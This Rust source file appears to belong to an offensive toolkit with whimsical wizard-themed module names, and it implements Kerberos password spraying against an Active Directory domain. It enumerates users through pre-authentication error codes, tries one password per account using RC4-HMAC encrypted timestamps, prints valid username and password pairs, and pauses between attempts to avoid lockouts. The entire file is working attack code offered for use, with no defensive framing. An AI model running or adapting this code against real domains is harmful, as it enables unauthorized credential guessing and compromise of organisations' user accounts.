use anyhow::{bail, Result};
use std::fs::File;
use std::io::{BufRead, BufReader};
use std::thread;
use std::time::Duration;

use crate::dungeon::krb_structures::*;
use crate::dungeon::floo_network;
use crate::dungeon::wand_utils;

pub struct BruteResult {
    pub username: String,
    pub password: String,
}

pub fn spray_domain(
    userlist: &str,
    password: &str,
    domain: &str,
    dc: Option<&str>,
    delay_ms: u64,
) -> Result<Vec<BruteResult>> {
    let file = File::open(userlist)?;
    let reader = BufReader::new(file);
    let dc_addr = match dc {
        Some(d) => d.to_owned(),
        None => floo_network::resolve_dc(domain)?,
    };
    let mut found = Vec::new();
    for line in reader.lines() {
        let username = line?.trim().to_owned();
        if username.is_empty() || username.starts_with('#') { continue; }
        match probe_user(&username, password, domain, &dc_addr) {
            Ok(true) => {
                found.push(BruteResult { username: username.clone(), password: password.to_owned() });
                crate::dungeon::display_charm::print_success(&format!("VALID: {}:{}", username, password));
            }
            Ok(false) => {}
            Err(e) => crate::dungeon::display_charm::print_warning(&format!("{}: {}", username, e)),
        }
        if delay_ms > 0 { thread::sleep(Duration::from_millis(delay_ms)); }
    }
    Ok(found)
}

fn probe_user(username: &str, password: &str, domain: &str, dc: &str) -> Result<bool> {
    use rand::random;
    use crate::dungeon::potions;
    let nonce: u32 = random();
    let cname = Glyph::new_principal(username);
    let padata = vec![Rune::pac_request(false)];
    let as_req = TomeRequest::new_as_req(cname, domain, &[ETYPE_RC4_HMAC], padata, nonce);
    let resp = floo_network::send_receive_kdc(dc, &as_req.encode())?;
    if DarkProphecy::is_error(&resp) {
        let e = DarkProphecy::decode(&resp)?;
        return match e.error_code {
            KDC_ERR_PREAUTH_REQUIRED => {
                // user exists; now try with password
                let key = potions::brew_nt_hash(password);
                let now = wand_utils::generalized_time_now();
                let enc_ts = EncTimestamp { patimestamp: now, pausec: Some(0) }.encode();
                let sealed = SealedChamber::new(
                    ETYPE_RC4_HMAC,
                    potions::enchant(ETYPE_RC4_HMAC, &key, KU_AS_REQ_PA_ENC_TIMESTAMP, &enc_ts)?,
                );
                let pa2 = vec![
                    Rune::pac_request(false),
                    Rune { pa_type: PA_ENC_TIMESTAMP, pa_value: sealed.encode() },
                ];
                let nonce2: u32 = random();
                let cname2 = Glyph::new_principal(username);
                let as_req2 = TomeRequest::new_as_req(cname2, domain, &[ETYPE_RC4_HMAC], pa2, nonce2);
                let resp2 = floo_network::send_receive_kdc(dc, &as_req2.encode())?;
                if DarkProphecy::is_error(&resp2) {
                    let e2 = DarkProphecy::decode(&resp2)?;
                    Ok(e2.error_code == KDC_ERR_NONE)
                } else {
                    Ok(true)
                }
            }
            KDC_ERR_C_PRINCIPAL_UNKNOWN => Ok(false),
            _ => Ok(false),
        };
    }
    Ok(false)
}
